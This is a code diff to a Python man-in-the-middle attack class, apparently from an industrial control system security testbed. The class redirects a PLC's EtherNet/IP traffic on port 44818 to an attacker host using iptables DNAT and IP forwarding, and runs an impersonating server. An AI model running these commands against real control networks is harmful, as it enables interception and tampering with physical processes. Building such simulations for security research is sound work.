@@ -32,17 +32,14 @@ class MitmAttack(SyncedAttack):
         os.system('sysctl net.ipv4.ip_forward=1')
         self.queue = fnfqueue.Connection()
         self.state = 0
-        # self.q = None
         self.thread = None
+        self.server = None
         self.run_thread = False
-
+        self.tags = {}
         self.dict_lock = threading.Lock()
 
     def setup(self):
         # Add the iptables rules
-        # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
-        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.1.1/24 -j SNAT --to-source 192.168.1.1')
-        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.3.1/24 -j SNAT --to-source 192.168.1.1')
         os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                   ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
         os.system('iptables -A FORWARD -p icmp -j DROP')
@@ -54,7 +51,9 @@ class MitmAttack(SyncedAttack):
         self.server = subprocess.Popen(cmd, shell=False)
 
         self.run_thread = True
-        self.tags = {}
+
+        self.update_tags_dict()
+
         self.thread = threading.Thread(target=self.cpppo_thread)
         self.thread.start()
 
